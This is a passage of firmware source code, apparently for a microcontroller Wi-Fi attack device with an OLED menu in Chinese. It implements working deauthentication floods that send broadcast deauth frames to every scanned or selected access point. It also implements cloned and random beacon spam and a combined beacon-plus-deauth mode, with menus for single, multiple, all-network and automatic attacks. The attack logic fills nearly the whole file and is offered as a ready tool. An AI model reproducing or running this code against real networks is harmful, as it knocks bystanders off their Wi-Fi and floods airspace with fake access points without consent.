  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      greenState = !greenState;
      digitalWrite(LED_G, greenState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if (digitalRead(BTN_OK) == LOW | digitalRead(BTN_BACK)==LOW){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      DeauthMenu();
      break;
    }
    
    for (size_t i = 0; i < scan_results.size(); i++) {
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      
      for (int x = 0; x < perdeauth; x++) {
        deauth_reason = 1;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        
        packetCount += 3;
        if (packetCount >= 10) {
          digitalWrite(LED_G, HIGH);
          delay(50);
          digitalWrite(LED_G, LOW);
          packetCount = 0;
        }
      }
    }
  }
}
void BeaconDeauth() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 25);
  u8g2_for_adafruit_gfx.print("信标+解除认证攻击中...");
  
  display.display();
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  int packetCount = 0;
  
  while (true) {
    if (digitalRead(BTN_OK) == LOW | digitalRead(BTN_BACK)==LOW){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      return;
    }

    // 如果有选中的目标，只攻击选中的
    if (!SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
        String ssid1 = scan_results[selectedIndex].ssid;
        const char *ssid1_cstr = ssid1.c_str();
        memcpy(becaon_bssid, scan_results[selectedIndex].bssid, 6);
        memcpy(deauth_bssid, scan_results[selectedIndex].bssid, 6);
        wext_set_channel(WLAN0_NAME, scan_results[selectedIndex].channel);
        
        for (int x = 0; x < 10; x++) {
          wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
          
          packetCount += 2;
          
          // 每发送10个包闪烁一次绿灯
          if (packetCount >= 400) {
            digitalWrite(LED_G, HIGH);
            delay(50);
            digitalWrite(LED_G, LOW);
            packetCount = 0;
          }
        }
      }
    }
  } 
  // 如果没有选中的目标，攻击所有
  else {
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
        
        packetCount += 2;
        
        // 每发送10个包闪烁一次绿灯
        if (packetCount >= 500) {
          digitalWrite(LED_G, HIGH);
          delay(50);
          digitalWrite(LED_G, LOW);
          packetCount = 0;
          }
        }
      }
    }
  }
}
void generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  // 确保MAC地址符合规范
  mac[0] &= 0xFC; // 清除最低两位
  mac[0] |= 0x02; // 设置为随机静态地址
}
void Beacon() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 25);
  u8g2_for_adafruit_gfx.print("相同信标攻击中...");
  
  display.display();
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  unsigned long prevBlink = 0;
  bool greenState = true;
  const int blinkInterval = 500;

  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      greenState = !greenState;
      digitalWrite(LED_G, greenState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if (digitalRead(BTN_OK) == LOW | digitalRead(BTN_BACK)==LOW){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      BeaconMenu();
      break;
    }

    if (!SelectedVector.empty()) {
      for (int selectedIndex : SelectedVector) {
        if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
          String ssid1 = scan_results[selectedIndex].ssid;
          const char *ssid1_cstr = ssid1.c_str();
          memcpy(becaon_bssid, scan_results[selectedIndex].bssid, 6);
          wext_set_channel(WLAN0_NAME, scan_results[selectedIndex].channel);
          
          for (int x = 0; x < 10; x++) {
            wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
          }
        }
      }
    } else {
      // 修复：将 one 改为 0，从第一个索引开始
      for (size_t i = 0; i < scan_results.size(); i++) {
        String ssid1 = scan_results[i].ssid;
        const char *ssid1_cstr = ssid1.c_str();
        memcpy(becaon_bssid, scan_results[i].bssid, 6);
        wext_set_channel(WLAN0_NAME, scan_results[i].channel);
        
        for (int x = 0; x < 10; x++) {
          wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        }
      }
    }
  }
}
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}
char randomString[19];
void RandomBeacon() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 25);
  u8g2_for_adafruit_gfx.print("随机信标攻击中...");
  
  display.display();
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  unsigned long prevBlink = 0;
  bool greenState = true;
  const int blinkInterval = 500;

  std::vector<int> targetChannels;
  
  if (!SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
        int channel = scan_results[selectedIndex].channel;
        bool channelExists = false;
        for (int existingChannel : targetChannels) {
          if (existingChannel == channel) {
            channelExists = true;
            break;
          }
        }
        if (!channelExists) {
          targetChannels.push_back(channel);
        }
      }
    }
  } else {
    for (int channel : allChannels) {
      targetChannels.push_back(channel);
    }
  }

  while (true) {
    unsigned long now = millis();
    
    if (now - prevBlink >= blinkInterval) {
      greenState = !greenState;
      digitalWrite(LED_G, greenState ? HIGH : LOW);
      prevBlink = now;
    }
    
    if (digitalRead(BTN_OK) == LOW | digitalRead(BTN_BACK)==LOW){
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      delay(200);
      BeaconMenu();
      break;
    }

    int randomIndex = random(0, targetChannels.size());
    int randomChannel = targetChannels[randomIndex];
    
    String ssid2 = generateRandomString(10);
    
    for (int i = 0; i < 6; i++) {
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME, randomChannel);
    
    for (int x = 0; x < 5; x++) {
      wifi_tx_beacon_frame(randomString, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid_cstr2);
    }
  }
}
int becaonstate = 0;

void BeaconMenu(){
  becaonstate = 0;
  while (true) {
    if(digitalRead(BTN_BACK)==LOW) {
      delay(200);
      drawattack();
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      delay(200);
      if(becaonstate == 0){
        RandomBeacon();
        break;
      }
      if(becaonstate == 1){
        Beacon();
        break;
      }
      if(becaonstate == 2){
        drawattack();
        break;
      }
    }
    if(digitalRead(BTN_UP)==LOW){
      delay(200);
      if(becaonstate > 0){
        becaonstate--;
      }
    }
    if(digitalRead(BTN_DOWN)==LOW){
      delay(200);
      if(becaonstate < 2){
        becaonstate++;
      }
    }
    
    display.clearDisplay();
    display.setTextSize(1);
    
    // 菜单项
    const char* menuItems[] = {
      "随机信标攻击",
      "相同信标攻击",
      "< 返回 >"
    };
    
    // 显示菜单项 - 保持一致的间距
    for (int i = 0; i < 3; i++) {
      int yPos = 5 + i * 12; // 使用相同的间距12
      
      if (i == becaonstate) {  // 将 currentState 改为 becaonstate
        display.fillRect(0, yPos-2, display.width() - 5, 12, SSD1306_WHITE);  // 统一的高亮区域
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+8);
        u8g2_for_adafruit_gfx.print(menuItems[i]);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+8);
        u8g2_for_adafruit_gfx.print(menuItems[i]);
      }
    }
    
    display.display();
    delay(50);
  }
}

void DeauthMenu() {
  deauthstate = 0;
  int startIndex = 0;  // 添加起始索引用于滚动
  
  while (true) {
    if(digitalRead(BTN_BACK)==LOW) {
      delay(200);
      drawattack();
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      delay(200);
      switch(deauthstate + startIndex) {
        case 0: Multi(); break;
        case 1: Single(); break;
        case 2: All(); break;
        case 3: AutoMulti(); break;
        case 4: AutoSingle(); break;
        case 5: drawattack(); break;
      }
      break;
    }
    if(digitalRead(BTN_UP)==LOW){
      delay(200);
      if(deauthstate > 0){
        deauthstate--;
      } else if(startIndex > 0) {
        startIndex--;
      }
    }
    if(digitalRead(BTN_DOWN)==LOW){
      delay(200);
      if(deauthstate < 4){
        deauthstate++;
      } else if(startIndex + 5 < 6) {
        startIndex++;
      }
    }
    
    display.clearDisplay();
    display.setTextSize(1);
    
    // 菜单项
    const char* menuItems[] = {
      "多重攻击",
      "单一攻击",
      "全网攻击",
      "自动多重攻击",
      "自动单一攻击",
      "< 返回 >"
    };
    
    // 显示菜单项 - 增加间距避免重叠
    for (int i = 0; i < 5; i++) {  // 只显示5行
      int menuIndex = startIndex + i;
      if(menuIndex >= 6) break;  // 防止越界
      
      int yPos = 5 + i * 12;
      
      if (i == deauthstate) {
        display.fillRect(0, yPos-2, display.width() - 5, 12, SSD1306_WHITE);  // 增加高亮区域高度
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+8);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+8);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
      }
    }
    display.display();
    delay(50);
  }
}
void drawattack() {
  attackstate = 0; // 重置选择状态
  while (true) {
    if(digitalRead(BTN_BACK)==LOW) break;
    if (digitalRead(BTN_OK) == LOW) {
      delay(300);
      if (attackstate == 0) {
        DeauthMenu();
        break;
      }
      if (attackstate == 1) {
        BeaconMenu();
        break;
      }
      if (attackstate == 2) {
        BeaconDeauth();
        break;
      }
      if (attackstate == 3) { // 修改索引
        break;
      }
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(200);
      if (attackstate > 0) {
        attackstate--;
      }
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      if (attackstate < 3) { // 修改最大索引为4
        attackstate++;
      }
    }
    
    // 显示菜单项
     display.clearDisplay();
    display.setTextSize(1);
    
    // 菜单项
    const char* menuItems[] = {
      "解除认证攻击",
      "信标攻击",
      "信标+解除认证攻击",
      "< 返回 >"
    };
    
    // 显示菜单项 - 调整高亮区域
    for (int i = 0; i < 4; i++) { // 修改循环条件为4，因为只有4个菜单项
      int yPos = 5 + i * 12;
      
      if (i == attackstate) {
        display.fillRect(0, yPos-2, display.width() - 5, 12, SSD1306_WHITE);  // 增加高亮区域宽度和高度
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+8);
        u8g2_for_adafruit_gfx.print(menuItems[i]);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+8);
        u8g2_for_adafruit_gfx.print(menuItems[i]);
      }
    }

    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 5 + 4 * 12 + 8); 
    u8g2_for_adafruit_gfx.print("QQ群:887958737");
    
    display.display();
    delay(50);
  }
}
void titleScreen(void) {
  display.clearDisplay();
  display.setTextWrap(false);
  display.setTextSize(1);       // Set text size to normal
  display.setTextColor(WHITE);  // Set text color to white
  display.setCursor(6, 7);
  u8g2_for_adafruit_gfx.setCursor(24, 48);
// 显示文本
u8g2_for_adafruit_gfx.print("By:Ghost 浪木");
  //display.setFont(&Org_01);`
  display.print("5 G H Z");
  //display.setFont(&Org_01);
u8g2_for_adafruit_gfx.setCursor(4, 60);
// 显示文本
u8g2_for_adafruit_gfx.print("QQ群:887958737");
  display.drawBitmap(1, 20, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(112, 35, image_off_text_bits, 12, 5, 1);
  display.drawBitmap(45, 19, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(68, 13, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(24, 34, image_off_text_bits, 12, 5, 1);
  display.drawBitmap(106, 14, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(109, 48, image_network_not_connected_bits, 15, 16, 1);
  //display.setFont(&Org_01);
  display.drawBitmap(88, 25, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(24, 14, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(9, 35, image_cross_contour_bits, 11, 16, 1);
  display.display();
  delay(2000);
}
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true);
  }
  u8g2_for_adafruit_gfx.begin(display);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312); // 设置中文字体
  titleScreen();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while (true) delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  SelectedSSID = scan_results[0].ssid;
  SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
}

void loop() {
  unsigned long currentTime = millis();
  if (menustate == 0) {
    delay(50);
    display.clearDisplay();
    display.setTextSize(1);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
    display.fillRect(0, 2, display.width() - 30, 12, SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 12);
    u8g2_for_adafruit_gfx.print("攻击");
    
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 27);
    u8g2_for_adafruit_gfx.print("扫描");
    
    u8g2_for_adafruit_gfx.setCursor(5, 42);
    u8g2_for_adafruit_gfx.print("选择");
    
    display.display();
  }
  if (menustate == 1) {
    delay(50);
    display.clearDisplay();
    display.setTextSize(1);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 12);
    u8g2_for_adafruit_gfx.print("攻击");
    
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
    display.fillRect(0, 17, display.width() - 30, 12, SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 27);
    u8g2_for_adafruit_gfx.print("扫描");
    
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 42);
    u8g2_for_adafruit_gfx.print("选择");
    
    display.display();
  }
  if (menustate == 2) {
    delay(50);
    display.clearDisplay();
    display.setTextSize(1);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 12);
    u8g2_for_adafruit_gfx.print("攻击");
    
    u8g2_for_adafruit_gfx.setCursor(5, 27);
    u8g2_for_adafruit_gfx.print("扫描");
    
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
    display.fillRect(0, 32, display.width() - 30, 12, SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 42);
    u8g2_for_adafruit_gfx.print("选择");
    
    display.display();
  }
  
  // 其余代码保持不变
  if (digitalRead(BTN_OK) == LOW) {
    delay(400);
    if (okstate) {
      if (menustate == 0) {
        drawattack();
      }
      if (menustate == 1) {
        drawscan();
      }
      if (menustate == 2) {
        drawssid();
      }
    }
  }
  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
      if (menustate > 0) {
        menustate--;
      }
      lastDownTime = currentTime;
    }
  }
  // Up Button
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
      if (menustate < 2) {
        menustate++;
      }
      lastUpTime = currentTime;
    }
  }
}
